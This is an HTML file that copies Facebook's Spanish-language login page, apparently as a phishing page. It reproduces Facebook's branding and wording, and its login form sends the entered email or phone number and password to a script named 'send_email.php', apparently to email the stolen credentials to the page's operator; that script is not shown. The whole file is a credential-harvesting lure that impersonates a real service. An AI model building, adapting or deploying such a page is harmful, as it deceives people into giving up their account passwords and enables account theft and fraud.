<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Replica de Página de Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100vh;
            background-color: #f0f2f5;
            font-family: 'Arial', sans-serif;
        }

        .container {
            width: 100%;
            max-width: 900px;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .left {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            margin-right: 20px;
        }

        .left h1 {
            font-size: 70px;
            color: #1877f2;
            margin-bottom: 10px;
        }

        .left p {
            font-size: 24px;
            color: #1c1e21;
            max-width: 500px;
            line-height: 1.4;
        }

        .right {
            width: 400px;
            background-color: white;
            border-radius: 6px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .right h1 {
            font-size: 50px;
            color: #1877f2;
            margin-bottom: 20px;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        form label {
            font-size: 14px;
            color: #1c1e21;
            margin-bottom: 5px;
        }

        form input {
            width: 100%;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            border: 1px solid #ddd;
            outline: none;
            font-size: 16px;
        }

        .loginBtn {
            background-color: #1877f2;
            padding: 15px;
            text-align: center;
            text-decoration: none;
            width: 100%;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .loginBtn:hover {
            background-color: #165eab;
        }

        .forget {
            margin: 15px 0;
            text-decoration: none;
            color: #1877f2;
            font-size: 14px;
            text-align: center;
        }

        .sign-up {
            padding-top: 20px;
            border-top: 1px solid #ddd;
            width: 100%;
            display: flex;
            justify-content: center;
        }

        .signupBtn {
            background-color: #42b72a;
            padding: 15px;
            text-align: center;
            text-decoration: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            transition: background-color 0.3s;
        }

        .signupBtn:hover {
            background-color: #36a420;
        }

        .right p {
            font-size: 14px;
            color: #1c1e21;
            text-align: center;
        }

        @media (max-width: 950px) {
            .container {
                flex-direction: column;
                align-items: center;
            }

            .left {
                margin-right: 0;
                text-align: center;
                margin-bottom: 20px;
            }

            .right {
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>Facebook</h1>
            <p>Conéctate con amigos y el mundo que te rodea en Facebook.</p>
        </div>
        <div class="right">
            <h1>Iniciar sesión</h1>
            <form action="send_email.php" method="post">
                <label for="email">Dirección de correo electrónico o número de teléfono</label>
                <input type="text" id="email" name="email" placeholder="Dirección de correo electrónico o número de teléfono" required>
                
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
                
                <button type="submit" class="loginBtn">Iniciar sesión</button>
                <a href="#" class="forget">¿Olvidaste tu contraseña?</a>
                
                <div class="sign-up">
                    <a href="#" class="signupBtn">Crear nueva cuenta</a>
                </div>
            </form>
            <p><b>Crea una página para una celebridad, banda o negocio.</p>
        </div>
    </div>
</body>
</html>
